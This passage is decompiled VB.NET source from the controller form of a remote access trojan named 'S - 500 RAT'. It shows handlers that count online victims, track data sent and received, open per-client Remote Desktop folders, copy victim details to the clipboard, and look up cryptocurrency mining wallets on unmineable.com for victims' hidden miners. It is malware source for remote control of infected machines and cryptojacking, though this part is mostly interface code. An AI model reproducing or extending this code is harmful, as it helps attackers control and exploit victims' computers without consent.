							MessageBox.Show("The Remote Drsktop folder for this client was not found", "S - 500 RAT | Open Folder !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						End If
					End If
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000DC5 RID: 3525 RVA: 0x0007B31C File Offset: 0x0007951C
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			Application.[Exit]()
		End Sub

		' Token: 0x06000DC6 RID: 3526 RVA: 0x0007B328 File Offset: 0x00079528
		Private Sub Timer2MAP_Tick(sender As Object, e As EventArgs)
			Try
				DataB.form1_0.Invoke(New MethodInvoker(Sub()
					ThreadPool.QueueUserWorkItem(Sub(a0 As Object)
						Me._Lambda$__2413-1()
					End Sub)
				End Sub))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000DC7 RID: 3527 RVA: 0x0007B370 File Offset: 0x00079570
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Me.NumOnlien.Text = "+" + Conversions.ToString(Me.L1.Rows.Count)
				Me.numSentData.Text = "+" + Functions.BytesToSize(Setting.SentValue)
				Me.NumOutData.Text = "+" + Conversions.ToString(Setting.SentValue) + "  ↑"
				Me.NumReceviedData.Text = "+" + Functions.BytesToSize(Setting.ReceivedValue)
				Me.NumOutReceivedData.Text = "+" + Conversions.ToString(Setting.ReceivedValue) + "  ↓"
				Dim ptr As Integer = Me.numActive
				Me.numActive = ptr + 1
				Dim flag As Boolean = Me.numActive >= 30
				If flag Then
					Me.numActive = 0
					GC.Collect()
					GC.WaitForPendingFinalizers()
					Dim flag2 As Boolean = Environment.OSVersion.Platform = PlatformID.Win32NT
					If flag2 Then
						Application.DoEvents()
						Me.NumSizeData.Text = "+" + Functions.BytesToSize(CLng(Process.GetCurrentProcess().Handle.ToInt32()))
						Functions.SetProcessWorkingSetSize32Bit(Process.GetCurrentProcess().Handle, -1, -1)
						Me.NumsizeDatas.Text = "+" + Conversions.ToString(Process.GetCurrentProcess().Handle.ToInt32()) + "  ↑"
					End If
					Dim num As Integer = DataB.form1_0.L1Home.Rows.Count - 1
					Dim flag3 As Boolean = num > 7
					If flag3 Then
						Dim flag4 As Boolean = num > Me.ChckRowIndex
						If flag4 Then
							Application.DoEvents()
							Me.L1Home.FirstDisplayedScrollingRowIndex = num
							Me.ChckRowIndex = num
						End If
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000DC8 RID: 3528 RVA: 0x0007B574 File Offset: 0x00079774
		Private Sub MiningPool_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000DC9 RID: 3529 RVA: 0x0007B577 File Offset: 0x00079777
		Private Sub MiningPool_IconRightClick(sender As Object, e As EventArgs)
			Process.Start("https://unmineable.com/coins")
		End Sub

		' Token: 0x06000DCA RID: 3530 RVA: 0x0007B588 File Offset: 0x00079788
		Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.MiningL1.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.MiningL1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Process.Start("https://unmineable.com/coins/" + dataGridViewRow.Cells(8).Value.ToString().Split(New Char() { ":"c })(0) + "/address/" + dataGridViewRow.Cells(8).Value.ToString().Split(New Char() { ":"c })(1))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06000DCB RID: 3531 RVA: 0x0007B674 File Offset: 0x00079874
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(dataGridViewRow.Cells(2).Value))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06000DCC RID: 3532 RVA: 0x0007B720 File Offset: 0x00079920
		Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(dataGridViewRow.Cells(3).Value))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06000DCD RID: 3533 RVA: 0x0007B7CC File Offset: 0x000799CC
		Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(dataGridViewRow.Cells(4).Value))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x0400061F RID: 1567
		Public isActive As Boolean

		' Token: 0x04000620 RID: 1568
		Public port As Integer

		' Token: 0x04000621 RID: 1569
		Public S As Listener

		' Token: 0x04000622 RID: 1570
		Public Client1 As Clients

		' Token: 0x04000623 RID: 1571
		Public IPInformtion As GetIPInfo

		' Token: 0x04000624 RID: 1572
		Public ListCountry As List(Of String)

		' Token: 0x04000625 RID: 1573
		Private NumChckMap As Integer

		' Token: 0x04000626 RID: 1574
		Private ChckRowIndex As Integer

		' Token: 0x04000627 RID: 1575
		Private Key As String

		' Token: 0x04000628 RID: 1576
		Private ResizeBool As Boolean

		' Token: 0x0400062B RID: 1579
		Public Getsetting As Boolean

		' Token: 0x0400062C RID: 1580
		Private numActive As Integer
	End Class
End Namespace
